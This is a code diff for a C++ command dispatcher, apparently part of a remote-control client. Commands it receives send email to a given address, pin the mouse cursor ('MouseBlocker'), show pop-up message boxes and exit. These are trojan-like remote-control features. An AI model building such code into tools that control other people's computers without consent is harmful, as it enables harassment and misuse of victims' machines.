@@ -1,4 +1,5 @@
 #include "command.h"
+#include "client.h"
 
 
 /*Converts command and directs them to proper functions*/
@@ -9,11 +10,11 @@ void Command::execCommand()
 	_cmd.erase(0, 2);
 	if (DEBUG)
 	{
-		std::cout << "\nPrepos: " << prepos << std::endl;
-		std::cout << "CMD: " << _cmd << std::endl;
+		//std::cout << "\nPrepos: " << prepos << std::endl;
+		//std::cout << "CMD: " << _cmd << std::endl;
 	}
 
-	/*V DIRECTOR V*/
+				/*V DIRECTOR V*/
 	if (prepos.compare("1$") == 0) //MailSender gets format: 1$title##msg@@address
 	{
 		if (DEBUG)
@@ -23,12 +24,15 @@ void Command::execCommand()
 		std::string title = getTitle(_cmd);
 		if (DEBUG)
 			std::cout << "Title: " << title << "\nMsg: " << msg << "\nAddress: " << address << std::endl;
-		//mail("avix133help@gmail.com", title.c_str(), msg.c_str());
+		mail(address.c_str(), title.c_str(), msg.c_str());
 	}
-	else if (prepos.compare("2$") == 0) //Mouseblocker
+	else if (prepos.compare("2$") == 0) //Mouseblocker gets format: 2$X..Y
 	{
 		if (DEBUG)
 			std::cout << "MouseBlocker...\n";
+		int x = getCursorX(_cmd);
+		int y = getCursorY(_cmd);
+			SetCursorPos(x, y);
 	}
 	else if (prepos.compare("3$") == 0) //MessageSender gets format: 3$title##msg
 	{
@@ -40,13 +44,23 @@ void Command::execCommand()
 		
 		MessageBox(NULL, msg.c_str() , title.c_str(), MB_ICONINFORMATION | MB_OKCANCEL);
 	}
-	else
+	else if (prepos.compare("$$") == 0)
+	{
+		exit(0);
+	}
+	/*else
 	{
 		if (DEBUG)
 			std::cout << "Command is invalid!\n";
-	}
+	}*/
 
 }
+
+/*Returns position of double repeat of 'code'.
+example:
+cmd = "test##blabla"
+returns 4
+*/
 int Command::getSeparation(std::string cmd, std::string code)
 {
 std::string temp_str;
@@ -112,5 +126,33 @@ int address_separator_pos; //@@
 
 std::string Command::getAddress(std::string cmd)
 {
-	return cmd;
+int address_separator_pos; //@@
+
+	address_separator_pos = getSeparation(cmd, "@") + 2;//2 cuz of @@
+
+	if (DEBUG)
+		std::cout << "getAddress: getSeparation # returned: " << address_separator_pos << std::endl;
+
+
+		return cmd.substr(address_separator_pos, (cmd.length() - address_separator_pos));
+}
+
+int Command::getCursorX(std::string cmd)
+{
+	std::string temp = cmd.substr(0, getSeparation(cmd, "."));
+
+	if (DEBUG)
+		std::cout << "x = " << atoi(temp.c_str()) << std::endl;
+	return atoi(temp.c_str());
+}
+
+int Command::getCursorY(std::string cmd)
+{
+int separator_pos = getSeparation(cmd, ".") + 2;	//2 cuz of ..
+
+	std::string temp = cmd.substr(separator_pos, cmd.length() - separator_pos); 
+
+	if (DEBUG)
+		std::cout << "x = " << atoi(temp.c_str()) << std::endl;
+	return atoi(temp.c_str());
 }
